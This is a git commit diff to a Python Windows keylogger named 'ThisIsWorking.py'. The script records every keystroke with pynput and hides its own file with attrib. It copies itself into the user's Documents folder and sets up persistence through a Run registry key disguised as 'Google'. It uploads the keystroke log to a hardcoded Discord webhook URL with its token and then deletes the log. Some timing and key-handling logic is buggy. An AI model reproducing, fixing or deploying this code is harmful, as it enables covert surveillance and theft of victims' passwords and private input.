14277bb681e0c87570626f147daef10a57a6b467
nchnnnn <92495274+nchnnnn@users.noreply.github.com>
2023-12-24 01:33:55 +0800

    WORKING

--- ThisIsWorking.py
+++ ThisIsWorking.py
@@ -8,41 +8,47 @@ from pynput import keyboard
 import math
 import winreg
 from pathlib import Path
+import sys
 
-
-def add_to_startup(script_path):
-    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
-    winreg.SetValueEx(key, "Google", 0, winreg.REG_SZ, script_path)
 
 # Example usage:
 
-# Discord webhook URL
+
 webhook_url = 'https://discord.com/api/webhooks/1187414843637121164/0P-BlEVuY9xMx9wCqZVO3ch2MJ415sjHesLvLaZVdqvGbp2KBEir391bj4X-FA_k0oG3'
 
-# Keylogger settings
-
-script_path = os.path.abspath(__file__)
-print(script_path)
-username = getpass.getuser()
-log_path = f"C:/Users/{username}/Documents/log.txt"
 keylogs_str = ""
-last_key_time = time.time()
-delay_duration = 600  # Set the delay duration in seconds
 
+delay_duration = 60  # Set the delay duration in seconds
+
+script_path = sys.argv[0] #Script Path with file
+
+source_path = Path(script_path)
 
 os.system(f"attrib +h {script_path}")  # Set hidden attribute on Windows
 os.chmod(script_path, 0o0700)
+username = getpass.getuser()
 
-source_path = Path(script_path)
 file_name = os.path.basename(script_path)
-print(file_name)
+
 destination_path = Path(f'C:/Users/{username}/Documents/{file_name}')
+
 source_path.rename(destination_path)
 
+print(script_path)
 
-add_to_startup(script_path)
 
-def send_webhook_with_file(webhook_url, file_path):
+print("Hidden")
+
+log_path = f"C:/Users/{username}/Documents/log.txt" # Set the Timer
+last_key_time = time.time()
+
+
+
+def add_to_startup(script_path): #Make the File Hidden
+    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
+    winreg.SetValueEx(key, "Google", 0, winreg.REG_SZ, script_path)
+
+def send_webhook_with_file(webhook_url, file_path): #Send to discord file
     with open(file_path, 'rb') as file:
         payload = {"content": "WORKING!"}
         files = {'file': (file_path, file)}
@@ -53,14 +59,14 @@ def send_webhook_with_file(webhook_url, file_path):
         else:
             print(f"Failed to send message. Status code: {response.status_code}")
 
-def send_keylogs_to_discord():
+def send_keylogs_to_discord(): #Indicate the timer and if the file exceed 2mb send it to discord
     global keylogs_str
     if keylogs_str:
         
         file_size = os.path.getsize(log_path) / (1024 * 1024)  # Convert bytes to megabytes
 
         print(math.floor(file_size))
-        if file_size >= 2 and time.time() - last_key_time > delay_duration:
+        if file_size >= 2 and time.time() - last_key_time == delay_duration:
             print(f"File size is {file_size:.2f} MB. Uploading to Discord and deleting...")
             send_webhook_with_file(webhook_url, log_path)
             os.remove(log_path)
@@ -73,15 +79,17 @@ def send_keylogs_to_discord():
         keylogs_str = ""
     return
 def get_capslock_state():
-    return ctypes.windll.user32.GetKeyState(0x14) & 1
+    return ctypes.windll.user32.GetKeyState(0x14)
 
 
-def handle_special_keys(key):
+def handle_special_keys(key): #Special Keys
     special_characters = {
         keyboard.Key.backspace: "\n [BackSpace]\n",
         keyboard.Key.enter: "\n [Enter]\n",
         keyboard.Key.space: " ",
+        keyboard.Key.ctrl_l: "\n [Ctrl]\n",
     }
+    
 
     if key in special_characters:
         print(f"{special_characters[key]} key pressed")
@@ -90,11 +98,12 @@ def handle_special_keys(key):
     if key == keyboard.Key.caps_lock:
         capslock_state = "[CAPSLOCK ON]" if get_capslock_state() else "[CAPSLOCK OFF]"
         print(f"Caps Lock is {capslock_state}")
-        return capslock_state
 
+    
+    
     return None
 
-def handle_numpad_keys(key):
+def handle_numpad_keys(key): #Numpad Keys
     numpad_key_mapping = {
         96: "0",
         97: "1",
@@ -114,23 +123,25 @@ def handle_numpad_keys(key):
         print(numpad_key_mapping[key.vk])
         return numpad_key_mapping[key.vk]
 
-def handle_regular_keys(key):
+def handle_regular_keys(key): #Regular Keys
     try:
         char = format(key.char)
         capslock_state = get_capslock_state()
-        print(capslock_state)
+
         if capslock_state:
             char = char.upper()
+        elif keyboard.Key.shift:
+            pass
         else:
             char = char.lower()
-
-        print(char)
+        
+        
         return char
     except AttributeError:
         print(f"Special key {key} pressed")
         return None
 
-def keyPressed(key):
+def keyPressed(key): #When pressing keys
     global keylogs_str
 
     with open(log_path, 'a') as log_file:
@@ -146,7 +157,6 @@ def keyPressed(key):
         else:
             regular_key_result = handle_regular_keys(key)
             if regular_key_result is not None:
-                print(regular_key_result)
                 log_file.write(regular_key_result)
                 keylogs_str += regular_key_result
 
@@ -156,9 +166,11 @@ keyboard.Listener(on_press=keyPressed)
 
 if __name__ == "__main__":
     listener = keyboard.Listener(on_press=keyPressed)
+    
+    
 
     listener.start()
-
+    
    
     try:    
 
@@ -169,9 +181,7 @@ if __name__ == "__main__":
             while True:
                 time_elapsed = time.time() - start_time
                 time_remaining = max(0, delay_duration - time_elapsed)
-
-                print(f"Time remaining: {time_remaining:.1f} seconds", end='\r')
-                print(keylogs_str)
+                print(f"Time remaining: {time_remaining:.1f} seconds")
                 if time_remaining == 0:
                     send_keylogs_to_discord()
                     break
